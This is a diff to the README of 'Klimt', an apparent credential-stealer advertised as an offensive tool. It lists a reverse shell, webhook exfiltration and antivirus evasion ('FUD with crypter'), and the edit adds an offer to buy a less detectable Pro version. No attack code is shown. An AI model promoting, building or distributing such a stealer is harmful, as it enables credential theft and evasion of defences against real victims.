@@ -1,4 +1,6 @@
-**You can private message me (<a href="https://discord.com/users/900072916597735444">yahweh#7023</a>) to purchase Pro Version.**
+**SOURCE CODE WILL BE RELEASED AT 10 STARS!**
+
+**You can private message me (<a href="https://discord.com/users/900072916597735444">yahweh#7023</a>) to inquire about purchasing the Pro Version and it's source code for a seperate fee.**
 
 [![Contributors][contributors-shield]][contributors-url]
 [![Forks][forks-shield]][forks-url]
@@ -79,8 +81,8 @@ Klimt is an offensive security tool designed for credential stealing, system inf
 
 - Reverse Shell: Optional connection to your external listener server (netcat, msf, etc.)
 - Custom GUI Builder with interactive widgets (Embed color picker, tabs, etc.)
-- No 3rd Party Packages Required! (Other than for the Builder application, but that doesn't affect the stub)
-- FUD With Crypter
+- Relatively small build size (4MB UPX'd) in comparison to other stealers (approx. 30MB+)
+- FUD With Crypter (Pro version is less detectable)
 - Encrypts strings stored in the config so that they aren't searchable in the binary, such as:
   - Discord Webhook URL
   - Reverse Shell Server Information
@@ -105,7 +107,7 @@ To install Klimt, make sure you have [GoLang](https://go.dev) installed and foll
 1. Clone the repository using `git clone https://github.com/codeuk/klimt.git`
 2. Open a terminal and navigate to the directory you installed Klimt in.
 3. Install the required dependencies using `go get ./...`
-4. Build the builder using `go build builder.go` or by running the `build.bat` file if you're on Windows
+4. Build the builder using `go build builder.go` or by opening the `build.bat` file if you're on Windows.
 
 ## Usage
 
@@ -119,7 +121,7 @@ The stealer build is approx. 4MB (UPX'd) and so far FUD (0 detections with the P
 
 ## Disclaimer
 
-Klimt is intended for legal and ethical use only. The developers and contributors of Klimt are not responsible for any illegal or unethical activities performed using this tool. Users of Klimt are solely responsible for their actions and are advised to use the tool for legitimate security testing purposes only.
+Klimt is intended for legal and ethical use only. The developers and contributors of Klimt are not responsible for any illegal or unethical activities performed using this tool. Users of Klimt are solely responsible for their actions and are advised to use the tool for legitimate security testing purposes only. Reselling this program as a closed-source binary is a crime, please do not steal the source.
 
 ## License
 
